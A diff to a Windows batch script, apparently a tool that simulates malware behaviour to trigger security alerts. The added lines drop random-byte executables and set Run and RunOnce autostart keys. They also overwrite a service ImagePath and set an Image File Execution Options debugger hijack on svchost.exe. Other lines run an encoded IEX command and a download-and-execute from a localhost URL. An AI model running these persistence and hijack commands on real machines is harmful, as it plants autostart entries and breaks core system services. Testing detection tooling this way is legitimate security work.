@@ -15,6 +15,12 @@ echo.
 
 mkdir "%TEMP%\service_payload" 2>nul
 
+echo [*] Stage 0: Maximum service persistence bootstrap
+"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "$rng = [System.Security.Cryptography.RandomNumberGenerator]::Create(); foreach ($f in @(\"$env:PUBLIC\\service_drop.exe\", \"$env:ProgramData\\service_drop.dll\", \"$env:PUBLIC\\service_drop.scr\", \"$env:TEMP\\service_payload\\boot.bin\")) { $bytes = [byte[]]::new(32768); $rng.GetBytes($bytes); [System.IO.File]::WriteAllBytes($f, $bytes) }"
+"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'ServiceHelper' -Value \"$env:PUBLIC\\service_drop.exe\" -PropertyType String -Force; New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce' -Name 'ServiceDrop' -Value \"$env:ProgramData\\service_drop.dll\" -PropertyType String -Force; New-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Services\WMIService' -Name 'ImagePath' -Value \"$env:PUBLIC\\service_drop.exe\" -PropertyType String -Force; New-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe' -Name 'Debugger' -Value \"$env:TEMP\\service_payload\\boot.bin\" -PropertyType String -Force"
+start /min powershell.exe -NoProfile -EncodedCommand SQBFAFgA >nul 2>&1
+start /min cmd.exe /c "echo service" >nul 2>&1
+
 mkdir "%TEMP%\argus_burst" 2>nul
 "%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "for ($i=0; $i -lt 12; $i++) { $bytes = [byte[]]::new(32768); [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($bytes); [System.IO.File]::WriteAllBytes(\"$env:TEMP\argus_burst\burst_$i.exe\", $bytes); [System.IO.File]::WriteAllBytes(\"$env:TEMP\argus_burst\burst_$i.dll\", $bytes) }"
 "%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "try { IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:1/payload') } catch { }"
